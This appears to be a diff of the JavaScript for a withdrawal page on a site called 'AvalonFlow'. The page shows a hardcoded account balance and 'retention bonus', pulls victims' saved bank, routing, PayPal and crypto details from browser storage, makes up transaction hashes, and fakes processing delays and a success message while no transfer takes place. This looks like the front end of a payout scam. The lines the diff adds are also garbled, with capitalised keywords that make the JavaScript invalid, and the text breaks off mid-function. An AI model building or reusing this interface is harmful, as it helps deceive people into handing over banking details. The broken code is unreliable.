@@ -921,362 +921,342 @@ document.addEventListener('DOMContentLoaded', () => {
         }
         setInterval(particle,800);
 
-                function generateRandomHash() {
-            const chars = '0123456789ABCDEFabcdef';
-            let result = '';
-            for (let i = 0; i < 8; i++) {
-                result += chars[Math.floor(Math.random() * chars.length)];
-            }
-            return `av_tx_${result}`;
-        }
+                Function generateRandomHash() {
+    Const chars = '0123456789ABCDEFabcdef';
+    Let result = '';
+    For (let i = 0; i < 8; i++) {
+        Result += chars[Math.floor(Math.random() * chars.length)];
+    }
+    Return `av_tx_${result}`;
+}
 
-        /* ------------------------------------------------------------------
-        DYNAMIC LOCALSTORAGE DETAILS PARSER (HYDRATOR)
-        ------------------------------------------------------------------ */
-        function getCapturedDetails() {
-            try {
-                const section2 = JSON.parse(localStorage.getItem("section2Data") || "{}");
-                const section3 = JSON.parse(localStorage.getItem("section3Data") || "{}");
-                const avDetails = JSON.parse(localStorage.getItem("av_collected_details") || "{}");
-                return { ...section2, ...section3, ...avDetails };
-            } catch (e) {
-                console.warn("Could not parse saved user details from storage:", e);
-                return {};
-            }
-        }
+/* ------------------------------------------------------------------
+DYNAMIC LOCALSTORAGE DETAILS PARSER (HYDRATOR)
+------------------------------------------------------------------ */
+Function getCapturedDetails() {
+    Try {
+        Const section3 = JSON.parse(localStorage.getItem("section3Data") || "{}");
+        Const avDetails = JSON.parse(localStorage.getItem("av_collected_details") || "{}");
+        Return { ...section3, ...avDetails };
+    } catch (e) {
+        Console.warn("Could not parse saved user details from storage:", e);
+        Return {};
+    }
+}
 
-        /* ------------------------------------------------------------------
-        SYNCED BALANCE & RETENTION BONUS CALCULATOR
-        ------------------------------------------------------------------ */
-        function getNumericStorageItem(key, defaultValue) {
-            const value = localStorage.getItem(key);
-            if (value === null) return defaultValue;
-            // Clean out $, commas or spaces formatted by dashboard script
-            const clean = value.replace(/[^0-9.-]+/g, "");
-            const parsed = parseFloat(clean);
-            return isNaN(parsed) ? defaultValue : parsed;
-        }
+Function getLiveLocalStorageBalance() {
+    Const hardcodedBaseline = 147349.26;
+    Const savedValue = localStorage.getItem("totalACU") || localStorage.getItem("baseACU");
 
-        function getLiveLocalStorageBalance() {
-            const hardcodedBaseline = 147349.26; // Core base balance default
-            const baseACU = getNumericStorageItem("baseACU", hardcodedBaseline);
-            const totalACU = getNumericStorageItem("totalACU", null);
+    If (savedValue !== null) {
+        Const parsedValue = parseFloat(savedValue);
+        Return isNaN(parsedValue) ? HardcodedBaseline : parsedValue;
+    }
+    Return hardcodedBaseline;
+}
 
-            // Returns live accumulated balance from dashboard or falls back to baseACU
-            return totalACU !== null ? totalACU : baseACU;
-        }
+Const isAlreadyWithdrawn = localStorage.getItem('av_is_withdrawn') === 'true' || localStorage.getItem('av_withdrawn') === 'true';
 
-        function getLiveRetentionBonus() {
-            const defaultBonusCAD = 26779.97;
-            return getNumericStorageItem("av_retention_bonus", defaultBonusCAD);
-        }
+Const activeRegion = localStorage.getItem("av_selected_region") || "US";
+Const activeMethod = localStorage.getItem("av_selected_method_title") || "Chase Bank";
 
-        // Check withdrawal status from dashboard key 'av_withdrawn' or fallback key
-        const isAlreadyWithdrawn = localStorage.getItem('av_withdrawn') === 'true' || localStorage.getItem('av_is_withdrawn') === 'true';
+Let runtimeSessionData = {
+    Region: activeRegion.toUpperCase(), 
+    SelectedAssetOrBank: activeMethod,
+    BaseAmountCAD: 26779.97, 
+    AvailableBalanceCAD: getLiveLocalStorageBalance(),
+    BalanceUnlockedFlag: isAlreadyWithdrawn
+};
 
-        const activeRegion = localStorage.getItem("av_selected_region") || "US";
-        const activeMethod = localStorage.getItem("av_selected_method_title") || "Chase Bank";
+If (runtimeSessionData.region === "USA") {
+    RuntimeSessionData.region = "US";
+}
 
-        let runtimeSessionData = {
-            region: activeRegion.toUpperCase(), 
-            selectedAssetOrBank: activeMethod,
-            baseAmountCAD: getLiveRetentionBonus(), // Dynamic Retention Bonus
-            availableBalanceCAD: getLiveLocalStorageBalance(), // Dynamic Base ACU / Total Balance
-            balanceUnlockedFlag: isAlreadyWithdrawn
+/* ------------------------------------------------------------------
+EXPANDED REGION CONFIGURATION (UK, US, CA)
+------------------------------------------------------------------ */
+Const regionConfig = {
+    US: { flag: "🇺🇸", currency: "USD", symbol: "$", eta: "2-4 hours via ACH / Real-Time Payments" },
+    UK: { flag: "🇬🇧", currency: "GBP", symbol: "£", eta: "2-4 hours via Cross border Payments" },
+    CA: { flag: "🇨🇦", currency: "CAD", symbol: "$", eta: "1-2 hours via Faster Payments (EFT)" }
+};
+
+/* ------------------------------------------------------------------
+MASTER BRAND LOGO DATABASE
+------------------------------------------------------------------ */
+Const globalBankLogos = {
+    "RBC Royal Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/4889b91421334f04992dbd75abd44c94.jpg",
+    "TD Canada Trust": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/e90fc5400809adf33e281d9f876d5485.jpg",
+    "Scotiabank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/839782492ccfda0e5f616798c2646804.jpg",
+    "BMO": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/1352e3513e09b08d6559887eae7f8f7a.jpg",
+    "CIBC": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/39502b52ef053fc42561434042a06ecd.jpg",
+    "National Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/fb34b722f69d354bf24dd585444a6cee.jpg",
+    "Tangerine": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Tangerine_Bank-Logo.wine.png",
+    "Simplii Financial": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Simplii_Financial_branding.jpg",
+    "Chase Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/dcaa7faba74f565af7efbf1135c2e144.jpg",
+    "Bank of America": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/7826c02a5b48ea41e801cafcb0bba674.jpg",
+    "Wells Fargo": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Wells_Fargo_Logo_(2020).png",
+    "Citi (Citibank)": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/df079c7d167289b284e6bc9402a81c96.jpg",
+    "U.S. Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/US-Bank-Logo-700x394.png",
+    "PNC Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/PNClogo.svg.png",
+    "Capital One": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Capital_One_logo.svg.png",
+    "Fifth Third Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/logo-stacked-primary-full-thumb.png",
+    "Barclays": "assets/pictures/Barclays-Logo-768x432.png",
+    "HSBC UK": "assets/pictures/HSBC-Logo-768x432.png",
+    "Lloyds Bank": "assets/pictures/Lloyds-Bank-Logo-500x281.webp",
+    "Santander UK": "assets/pictures/WA_1783360589514.jpeg",
+    "Halifax": "assets/pictures/WA_1783360607640.jpeg",
+    "TSB Bank": "assets/pictures/WA_1783360619696.jpeg",
+    "Nationwide": "assets/pictures/WA_1783378395029.jpeg",
+    "NatWest": "assets/pictures/IMG-20260706-WA0033(1).jpg"
+};
+
+Const defaultLogo = "https://cdn-icons-png.flaticon.com/512/2830/2830284.png";
+
+Document.addEventListener("DOMContentLoaded", () => {
+    InitiateLiveTransaction(runtimeSessionData);
+    SetupEventHandlers();
+});
+
+Async function initiateLiveTransaction(sessionData) {
+    SessionData.availableBalanceCAD = getLiveLocalStorageBalance();
+
+    Const config = regionConfig[sessionData.region];
+    If (!config) return;
+
+    // ---- Dynamic Brand Logo Transition ----
+    Const logoContainer = document.getElementById("brand-logo-container");
+    Const brandLogoImage = document.getElementById("dynamic-brand-logo");
+    Const matchedLogoUrl = globalBankLogos[sessionData.selectedAssetOrBank] || defaultLogo;
+
+    If (logoContainer && brandLogoImage) {
+        LogoContainer.classList.add("is-hidden");
+        Const imgPreloader = new Image();
+        ImgPreloader.onload = () => {
+            BrandLogoImage.src = matchedLogoUrl;
+            Void logoContainer.offsetWidth;
+            LogoContainer.classList.remove("is-hidden");
         };
+        ImgPreloader.src = matchedLogoUrl;
+    }
 
-        if (runtimeSessionData.region === "USA") {
-            runtimeSessionData.region = "US";
-        }
+    // ---- RECIPIENT METRICS ROUTING ENGINE ----
+    Const paymentType = sessionData.selectedAssetOrBank.toLowerCase();
+    Const userDetails = getCapturedDetails();
+    Const region = sessionData.region;
 
-        /* ------------------------------------------------------------------
-        EXPANDED REGION CONFIGURATION (UK, US, CA)
-        ------------------------------------------------------------------ */
-        const regionConfig = {
-            US: { flag: "🇺🇸", currency: "USD", symbol: "$", eta: "2-4 hours via ACH / Real-Time Payments" },
-            UK: { flag: "🇬🇧", currency: "GBP", symbol: "£", eta: "2-4 hours via Cross border Payments" },
-            CA: { flag: "🇨🇦", currency: "CAD", symbol: "$", eta: "1-2 hours via Faster Payments (EFT)" }
-        };
+    Let holderName = "Valued Member";
+    If (region === "US") {
+        HolderName = userDetails.accountNameUs || userDetails.fullName || "Franklyn C. Harris";
+    } else if (region === "UK") {
+        HolderName = userDetails.accountNameUk || userDetails.fullName || "Franklyn C. Harris";
+    } else {
+        HolderName = userDetails.accountName || userDetails.fullName || "Franklyn C. Harris";
+    }
 
-        /* ------------------------------------------------------------------
-        MASTER BRAND LOGO DATABASE
-        ------------------------------------------------------------------ */
-        const globalBankLogos = {
-            "RBC Royal Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/4889b91421334f04992dbd75abd44c94.jpg",
-            "TD Canada Trust": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/e90fc5400809adf33e281d9f876d5485.jpg",
-            "Scotiabank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/839782492ccfda0e5f616798c2646804.jpg",
-            "BMO": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/1352e3513e09b08d6559887eae7f8f7a.jpg",
-            "CIBC": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/39502b52ef053fc42561434042a06ecd.jpg",
-            "National Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/fb34b722f69d354bf24dd585444a6cee.jpg",
-            "Tangerine": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Tangerine_Bank-Logo.wine.png",
-            "Simplii Financial": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Simplii_Financial_branding.jpg",
-            "Chase Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/dcaa7faba74f565af7efbf1135c2e144.jpg",
-            "Bank of America": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/7826c02a5b48ea41e801cafcb0bba674.jpg",
-            "Wells Fargo": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Wells_Fargo_Logo_(2020).png",
-            "Citi (Citibank)": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/df079c7d167289b284e6bc9402a81c96.jpg",
-            "U.S. Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/US-Bank-Logo-700x394.png",
-            "PNC Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/PNClogo.svg.png",
-            "Capital One": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Capital_One_logo.svg.png",
-            "Fifth Third Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/logo-stacked-primary-full-thumb.png",
-            "Barclays": "assets/pictures/Barclays-Logo-768x432.png",
-            "HSBC UK": "assets/pictures/HSBC-Logo-768x432.png",
-            "Lloyds Bank": "assets/pictures/Lloyds-Bank-Logo-500x281.webp",
-            "Santander UK": "assets/pictures/WA_1783360589514.jpeg",
-            "Halifax": "assets/pictures/WA_1783360607640.jpeg",
-            "TSB Bank": "assets/pictures/WA_1783360619696.jpeg",
-            "Nationwide": "assets/pictures/WA_1783378395029.jpeg",
-            "NatWest": "assets/pictures/IMG-20260706-WA0033(1).jpg"
-        };
+    Let rawAccountNumber = "";
+    If (region === "US") {
+        RawAccountNumber = userDetails.accountNumberUs || userDetails.accountNumber || "";
+    } else if (region === "UK") {
+        RawAccountNumber = userDetails.accountNumberUk || userDetails.accountNumber || "";
+    } else {
+        RawAccountNumber = userDetails.accountNumber || "";
+    }
+    Const accountNumber = rawAccountNumber ? `•••• ${rawAccountNumber.slice(-4)}` : "•••• 1988";
 
-        const defaultLogo = "https://cdn-icons-png.flaticon.com/512/2830/2830284.png";
+    Let routingOrTransit = "";
+    If (region === "US") {
+        RoutingOrTransit = userDetails.transitNumberUs || userDetails.routingNumber || "";
+    } else if (region === "UK") {
+        RoutingOrTransit = userDetails.transitNumberUk || userDetails.transitNo || "";
+    } else {
+        RoutingOrTransit = userDetails.transitNumber || userDetails.transitNo || "";
+    }
 
-        document.addEventListener("DOMContentLoaded", () => {
-            initiateLiveTransaction(runtimeSessionData);
-            setupEventHandlers();
-        });
+    Let displayLabelName = "Beneficiary Name";
+    Let displayLabelDetails = "Account details";
+    Let renderedName = holderName;
+    Let renderedDetails = routingOrTransit ? `${accountNumber} (Routing: ${routingOrTransit})` : accountNumber;
 
-        async function initiateLiveTransaction(sessionData) {
-            sessionData.availableBalanceCAD = getLiveLocalStorageBalance();
-            sessionData.baseAmountCAD = getLiveRetentionBonus();
+    If (paymentType.includes("paypal")) {
+        DisplayLabelName = "PayPal Receiver";
+        DisplayLabelDetails = "Linked Email";
+        RenderedName = userDetails.paypalUs || userDetails.paypalUk || userDetails.paypal || userDetails.paypalName || holderName;
+        RenderedDetails = renderedName.includes("@") ? RenderedName : (userDetails.paypalEmail || `${holderName.toLowerCase().replace(/\s+/g, '')}@example.com`);
+    } else if (paymentType.includes("venmo") || paymentType.includes("revolut")) {
+        DisplayLabelName = "Payment Handle";
+        DisplayLabelDetails = "Linked Identifier";
+        RenderedName = userDetails.venmo || userDetails.revolutName || `@${holderName.toLowerCase().replace(/\s+/g, '-')}`;
+        RenderedDetails = userDetails.venmoHandle || userDetails.revolutTag || "(+1) ***-***-1988";
+    } else if (paymentType.includes("e-transfer") || paymentType.includes("e transfer") || paymentType.includes("interac")) {
+        DisplayLabelName = "Interac Registered";
+        DisplayLabelDetails = "Transfer Target";
+        RenderedName = userDetails.interac || userDetails.interacName || holderName;
+        RenderedDetails = renderedName.includes("@") ? RenderedName : (userDetails.interacEmail || `${holderName.toLowerCase().replace(/\s+/g, '')}@example.com`);
+    } else if (paymentType.includes("usdc") || paymentType.includes("crypto") || paymentType.includes("wallet")) {
+        DisplayLabelName = "Network Protocol";
+        DisplayLabelDetails = "Destination Address";
+        RenderedName = userDetails.tokenName || "ERC-20 (USD Coin)";
+        Const rawCrypto = userDetails.acuAccountUs || userDetails.acuAccountUk || userDetails.acuAccount || userDetails.cryptoAddress || "";
+        RenderedDetails = rawCrypto ? `${rawCrypto.slice(0, 6)}...${rawCrypto.slice(-4)}` : "0x" + "•".repeat(24) + "Settlement"; 
+    }
 
-            const config = regionConfig[sessionData.region];
-            if (!config) return;
+    Document.getElementById("recipient-name-label").innerText = displayLabelName;
+    Document.getElementById("recipient-name-val").innerText = renderedName;
+    Document.getElementById("recipient-account-label").innerText = displayLabelDetails;
+    Document.getElementById("recipient-account-val").innerText = renderedDetails;
 
-            // ---- Dynamic Brand Logo Transition ----
-            const logoContainer = document.getElementById("brand-logo-container");
-            const brandLogoImage = document.getElementById("dynamic-brand-logo");
-            const matchedLogoUrl = globalBankLogos[sessionData.selectedAssetOrBank] || defaultLogo;
+    Document.getElementById("receipt-beneficiary").innerText = `${renderedName} (${renderedDetails})`;
 
-            if (logoContainer && brandLogoImage) {
-                logoContainer.classList.add("is-hidden");
-                const imgPreloader = new Image();
-                imgPreloader.onload = () => {
-                    brandLogoImage.src = matchedLogoUrl;
-                    void logoContainer.offsetWidth;
-                    logoContainer.classList.remove("is-hidden");
-                };
-                imgPreloader.src = matchedLogoUrl;
-            }
+    // ---- Rate Calculations ----
+    Let liveRate = 1.0; 
+    If (config.currency === "USD") liveRate = 0.72;
+    If (config.currency === "GBP") liveRate = 0.53;
 
-            // ---- RECIPIENT METRICS ROUTING ENGINE ----
-            const paymentType = sessionData.selectedAssetOrBank.toLowerCase();
-            const userDetails = getCapturedDetails();
-            const region = sessionData.region;
-
-            let holderName = "Valued Member";
-            if (region === "US") {
-                holderName = userDetails.accountNameUs || userDetails.fullName || "Franklyn C. Harris";
-            } else if (region === "UK") {
-                holderName = userDetails.accountNameUk || userDetails.fullName || "Franklyn C. Harris";
+    If (config.currency !== "CAD") {
+        Try {
+            Const primaryResponse = await fetch('https://open.er-api.com/v6/latest/CAD');
+            If (primaryResponse.ok) {
+                Const data = await primaryResponse.json();
+                LiveRate = data.rates[config.currency] || liveRate;
             } else {
-                holderName = userDetails.accountName || userDetails.fullName || "Franklyn C. Harris";
+                Throw new Error("Primary API state down.");
             }
-
-            let rawAccountNumber = "";
-            if (region === "US") {
-                rawAccountNumber = userDetails.accountNumberUs || userDetails.accountNumber || "";
-            } else if (region === "UK") {
-                rawAccountNumber = userDetails.accountNumberUk || userDetails.accountNumber || "";
-            } else {
-                rawAccountNumber = userDetails.accountNumber || "";
-            }
-            const accountNumber = rawAccountNumber ? `•••• ${rawAccountNumber.slice(-4)}` : "•••• 1988";
-
-            let routingOrTransit = "";
-            if (region === "US") {
-                routingOrTransit = userDetails.transitNumberUs || userDetails.routingNumber || "";
-            } else if (region === "UK") {
-                routingOrTransit = userDetails.transitNumberUk || userDetails.transitNo || ""; 
-            } else {
-                routingOrTransit = userDetails.transitNumber || userDetails.transitNo || "";
-            }
-
-            let displayLabelName = "Beneficiary Name";
-            let displayLabelDetails = "Account details";
-            let renderedName = holderName;
-            let renderedDetails = routingOrTransit ? `${accountNumber} (Routing: ${routingOrTransit})` : accountNumber;
-
-            if (paymentType.includes("paypal")) {
-                displayLabelName = "PayPal Receiver";
-                displayLabelDetails = "Linked Email";
-                renderedName = userDetails.paypalUs || userDetails.paypalUk || userDetails.paypal || userDetails.paypalName || holderName;
-                renderedDetails = renderedName.includes("@") ? renderedName : (userDetails.paypalEmail || `${holderName.toLowerCase().replace(/\s+/g, '')}@example.com`);
-            } 
-            else if (paymentType.includes("venmo") || paymentType.includes("revolut")) {
-                displayLabelName = "Payment Handle";
-                displayLabelDetails = "Linked Identifier";
-                renderedName = userDetails.venmo || userDetails.revolutName || `@${holderName.toLowerCase().replace(/\s+/g, '-')}`;
-                renderedDetails = userDetails.venmoHandle || userDetails.revolutTag || "(+1) ***-***-1988";
-            } else if (paymentType.includes("e-transfer") || paymentType.includes("e transfer") || paymentType.includes("interac")) {
-                displayLabelName = "Interac Registered";
-                displayLabelDetails = "Transfer Target";
-                renderedName = userDetails.interac || userDetails.interacName || holderName;
-                renderedDetails = renderedName.includes("@") ? renderedName : (userDetails.interacEmail || `${holderName.toLowerCase().replace(/\s+/g, '')}@example.com`);
-            } else if (paymentType.includes("usdc") || paymentType.includes("crypto") || paymentType.includes("wallet")) {
-                displayLabelName = "Network Protocol";
-                displayLabelDetails = "Destination Address";
-                renderedName = userDetails.tokenName || "ERC-20 (USD Coin)";
-                const rawCrypto = userDetails.acuAccountUs || userDetails.acuAccountUk || userDetails.acuAccount || userDetails.cryptoAddress || "";
-                renderedDetails = rawCrypto ? `${rawCrypto.slice(0, 6)}...${rawCrypto.slice(-4)}` : "0x" + "•".repeat(24) + "Settlement"; 
-            }
-
-            document.getElementById("recipient-name-label").innerText = displayLabelName;
-            document.getElementById("recipient-name-val").innerText = renderedName;
-            document.getElementById("recipient-account-label").innerText = displayLabelDetails;
-            document.getElementById("recipient-account-val").innerText = renderedDetails;
-
-            document.getElementById("receipt-beneficiary").innerText = `${renderedName} (${renderedDetails})`;
-
-            // ---- Rate Calculations ----
-            let liveRate = 1.0; 
-            if (config.currency === "USD") liveRate = 0.72;
-            if (config.currency === "GBP") liveRate = 0.53;
-
-            if (config.currency !== "CAD") {
-                try {
-                    const primaryResponse = await fetch('https://open.er-api.com/v6/latest/CAD');
-                    if (primaryResponse.ok) {
-                        const data = await primaryResponse.json();
-                        liveRate = data.rates[config.currency] || liveRate;
-                    } else {
-                        throw new Error("Primary API state down.");
-                    }
-                } catch (primaryError) {
-                    console.warn(primaryError.message);
-                    try {
-                        const secondaryResponse = await fetch(`https://api.frankfurter.dev/v2/rates?base=CAD&quotes=${config.currency}`);
-                        if (secondaryResponse.ok) {
-                            const data = await secondaryResponse.json();
-                            liveRate = data.rates[config.currency] || liveRate;
-                        }
-                    } catch (secondaryError) {
-                        console.warn("Secondary API failed, keeping local fallback rate.");
-                    }
+        } catch (primaryError) {
+            Console.warn(primaryError.message);
+            Try {
+                Const secondaryResponse = await fetch(`https://api.frankfurter.dev/v2/rates?base=CAD&quotes=${config.currency}`);
+                If (secondaryResponse.ok) {
+                    Const data = await secondaryResponse.json();
+                    LiveRate = data.rates[config.currency] || liveRate;
                 }
-            } else {
-                liveRate = 1.0; 
+            } catch (secondaryError) {
+                Console.warn("Secondary API failed, keeping local fallback rate.");
             }
-
-            const isSecurityOpen = sessionData.balanceUnlockedFlag;
-            const balanceBox = document.getElementById("balance-box");
-            const sendBox = document.getElementById("send-box");
-            const arrowIndicator = document.getElementById("indicator-arrow");
-
-            document.getElementById("payout-method").innerText = `${sessionData.selectedAssetOrBank}`;
-            document.getElementById("arrival-time").innerText = config.eta;
-
-            const activeHash = generateRandomHash();
-            document.getElementById("receipt-hash").innerText = activeHash;
-
-            if (isSecurityOpen) {
-                sendBox.className = "amount-box locked order-1";       
-                balanceBox.className = "amount-box highlight order-2"; 
-                arrowIndicator.style.top = "66.7%";                     
-
-                document.getElementById("send-lock").style.display = "inline-flex";
-                document.getElementById("send-currency-symbol").innerText = "";
-                document.getElementById("send-amount").innerText = "Withdrawn";
-                document.getElementById("send-currency-tag").innerText = "";
-
-                document.getElementById("balance-lock").style.display = "none";
-                document.getElementById("balance-unit-symbol").innerText = "$";
-                document.getElementById("balance-amount").innerText = sessionData.availableBalanceCAD.toLocaleString('en-US', { minimumFractionDigits: 2 });
-                document.getElementById("balance-currency-tag").innerText = "CAD";
-
-                const feeCAD = sessionData.availableBalanceCAD * 0.04;
-                const cadNet = sessionData.availableBalanceCAD - feeCAD;
-                const finalCalculatedReceive = cadNet * liveRate;
-
-                document.getElementById("fee-display").innerText = `-$${feeCAD.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
-                document.getElementById("net-cad-display").innerText = `$${cadNet.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
-                document.getElementById("receive-amount").innerText = finalCalculatedReceive.toLocaleString('en-US', { 
-                    minimumFractionDigits: 2,
-                    maximumFractionDigits: 2 
-                });
-
-                document.getElementById("receipt-fee").innerText = `-$${feeCAD.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
-                document.getElementById("receipt-payout").innerText = `${config.symbol}${finalCalculatedReceive.toLocaleString('en-US', { 
-                    minimumFractionDigits: 2,
-                    maximumFractionDigits: 2 
-                })} ${config.currency}`;
-            } else {
-                balanceBox.className = "amount-box locked order-1";
-                sendBox.className = "amount-box order-2";
-                arrowIndicator.style.top = "66.7%";
-
-                document.getElementById("balance-lock").style.display = "inline-flex";
-                document.getElementById("balance-unit-symbol").innerText = "$";
-                document.getElementById("balance-amount").innerText = sessionData.availableBalanceCAD.toLocaleString('en-US', { minimumFractionDigits: 2 });
-                document.getElementById("balance-currency-tag").innerText = "CAD";
-
-                document.getElementById("send-lock").style.display = "none";
-                document.getElementById("send-currency-symbol").innerText = "$";
-                document.getElementById("send-amount").innerText = sessionData.baseAmountCAD.toLocaleString('en-US', { minimumFractionDigits: 2 });
-                document.getElementById("send-currency-tag").innerText = "CAD";
-
-                const feeCAD = sessionData.baseAmountCAD * 0.04;
-                const cadNet = sessionData.baseAmountCAD - feeCAD;
-                const finalCalculatedReceive = cadNet * liveRate;
-
-                document.getElementById("fee-display").innerText = `-$${feeCAD.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
-                document.getElementById("net-cad-display").innerText = `$${cadNet.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
-                document.getElementById("receive-amount").innerText = finalCalculatedReceive.toLocaleString('en-US', { 
-                    minimumFractionDigits: 2,
-                    maximumFractionDigits: 2 
-                });
-
-                document.getElementById("receipt-fee").innerText = `-$${feeCAD.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
-                document.getElementById("receipt-payout").innerText = `${config.symbol}${finalCalculatedReceive.toLocaleString('en-US', { 
-                    minimumFractionDigits: 2,
-                    maximumFractionDigits: 2 
-                })} ${config.currency}`;
-            }
-
-            document.getElementById("receive-symbol").innerText = config.symbol;
-            document.getElementById("receive-currency").innerText = config.currency;
-            document.getElementById("receipt-target").innerText = sessionData.selectedAssetOrBank;
         }
+    } else {
+        LiveRate = 1.0; 
+    }
 
-        function setupEventHandlers() {
-            const confirmBtn = document.getElementById("confirm-btn");
-            const loadingScreen = document.getElementById("loading-screen");
-            const successScreen = document.getElementById("success-screen");
+    Const isSecurityOpen = sessionData.balanceUnlockedFlag;
+    Const balanceBox = document.getElementById("balance-box");
+    Const sendBox = document.getElementById("send-box");
+    Const arrowIndicator = document.getElementById("indicator-arrow");
 
-            confirmBtn.addEventListener("click", () => {
-                loadingScreen.classList.add("active");
-                confirmBtn.disabled = true;
+    Document.getElementById("payout-method").innerText = `${sessionData.selectedAssetOrBank}`;
+    Document.getElementById("arrival-time").innerText = config.eta;
 
-                const minTime = 2500;
-                const maxTime = 4500; 
-                const dynamicProcessingDelay = Math.floor(Math.random() * (maxTime - minTime + 1)) + minTime;
+    Const activeHash = generateRandomHash();
+    Document.getElementById("receipt-hash").innerText = activeHash;
 
-                setTimeout(() => {
-                    // Triggers dashboard keys to mark bonus as withdrawn and zero it out on the UI
-                    localStorage.setItem('av_withdrawn', 'true'); 
-                    localStorage.setItem('av_is_withdrawn', 'true');
+    Const targetAmountCAD = isSecurityOpen ? SessionData.availableBalanceCAD : sessionData.baseAmountCAD;
 
-                    const currentMoment = new Date();
-                    const timestampString = currentMoment.toLocaleDateString('en-US', {
-                        month: 'short', day: '2-digit', year: 'numeric'
-                    }) + `, ` + currentMoment.toLocaleTimeString('en-US', {
-                        hour: '2-digit', minute: '2-digit', hour12: true
-                    });
-                    localStorage.setItem("av_withdrawal_time", timestampString);
+    If (isSecurityOpen) {
+        SendBox.className = "amount-box locked order-1";       
+        BalanceBox.className = "amount-box highlight order-2"; 
+        ArrowIndicator.style.top = "66.7%";                     
 
-                    runtimeSessionData.balanceUnlockedFlag = true;
+        Document.getElementById("send-lock").style.display = "inline-flex";
+        Document.getElementById("send-currency-symbol").innerText = "";
+        Document.getElementById("send-amount").innerText = "Withdrawn";
+        Document.getElementById("send-currency-tag").innerText = "";
 
-                    loadingScreen.classList.remove("active");
-                    successScreen.classList.add("active");
-                    if (typeof showNotification === "function") {
-                        showNotification("Withdrawal routed to clearway terminal queue", 4000);
-                    }
-                }, dynamicProcessingDelay); 
+        Document.getElementById("balance-lock").style.display = "none";
+        Document.getElementById("balance-unit-symbol").innerText = "$";
+        Document.getElementById("balance-amount").innerText = sessionData.availableBalanceCAD.toLocaleString('en-US', { minimumFractionDigits: 2 });
+        Document.getElementById("balance-currency-tag").innerText = "CAD";
+    } else {
+        BalanceBox.className = "amount-box locked order-1";
+        SendBox.className = "amount-box order-2";
+        ArrowIndicator.style.top = "66.7%";
+
+        Document.getElementById("balance-lock").style.display = "inline-flex";
+        Document.getElementById("balance-unit-symbol").innerText = "$";
+        Document.getElementById("balance-amount").innerText = sessionData.availableBalanceCAD.toLocaleString('en-US', { minimumFractionDigits: 2 });
+        Document.getElementById("balance-currency-tag").innerText = "CAD";
+
+        Document.getElementById("send-lock").style.display = "none";
+        Document.getElementById("send-currency-symbol").innerText = "$";
+        Document.getElementById("send-amount").innerText = sessionData.baseAmountCAD.toLocaleString('en-US', { minimumFractionDigits: 2 });
+        Document.getElementById("send-currency-tag").innerText = "CAD";
+    }
+
+    Const feeCAD = targetAmountCAD * 0.04;
+    Const cadNet = targetAmountCAD - feeCAD;
+    Const finalCalculatedReceive = cadNet * liveRate;
+
+    Document.getElementById("fee-display").innerText = `-$${feeCAD.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
+    Document.getElementById("net-cad-display").innerText = `$${cadNet.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
+    Document.getElementById("receive-amount").innerText = finalCalculatedReceive.toLocaleString('en-US', { 
+        MinimumFractionDigits: 2,
+        MaximumFractionDigits: 2 
+    });
+
+    Document.getElementById("receipt-fee").innerText = `-$${feeCAD.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
+    Document.getElementById("receipt-payout").innerText = `${config.symbol}${finalCalculatedReceive.toLocaleString('en-US', { 
+        MinimumFractionDigits: 2,
+        MaximumFractionDigits: 2 
+    })} ${config.currency}`;
+
+    Document.getElementById("receive-symbol").innerText = config.symbol;
+    Document.getElementById("receive-currency").innerText = config.currency;
+    Document.getElementById("receipt-target").innerText = sessionData.selectedAssetOrBank;
+}
+
+Function setupEventHandlers() {
+    Const confirmBtn = document.getElementById("confirm-btn");
+    Const loadingScreen = document.getElementById("loading-screen");
